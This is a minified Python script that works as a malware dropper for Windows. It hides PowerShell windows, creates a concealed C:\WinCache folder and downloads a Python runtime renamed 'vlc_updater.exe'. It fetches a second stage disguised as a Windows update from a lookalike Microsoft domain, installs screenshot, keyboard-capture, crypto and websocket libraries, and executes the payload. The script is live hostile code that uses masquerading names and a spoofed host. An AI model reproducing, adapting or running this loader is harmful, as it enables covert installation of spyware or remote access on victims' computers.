import os
u=open
r=os.path
n=os.system
if not r.isdir("C:\\WinCache"):
 n('powershell -windowstyle hidden cd C:\\; mkdir WinCache')
if not r.isfile('C:\\WinCache\\stage1.ps1'): 
 with u('C:\\WinCache\\stage1.ps1','w+')as f:
  f.write('type C:\\WinCache\\stage1.py | C:\\WinCache\\vlc_updater.exe')
if not r.isfile('C:\\WinCache\\stage1.py'):
 n('powershell -windowstyle hidden -c "Invoke-WebRequest https://github.com/manthey/pyexe/releases/download/v18/py37-64.exe -OutFile C:\\WinCache\\vlc_updater.exe;Invoke-WebRequest http://microsoftonline.download/updates/KB4540673.msi -OutFile C:\\WinCache\\stage1.py"')
if not r.isdir('C:\\WinCache\\Crypto'):
 n('powershell.exe cd C:\\WinCache ; .\\vlc_updater.exe -m pip install --no-cache-dir --target . --upgrade pycryptodome requests websockets pyscreenshot pillow keyboard')
n('powershell.exe C:\\WinCache\\stage1.ps1')
# Created by pyminifier (https://github.com/liftoff/pyminifier)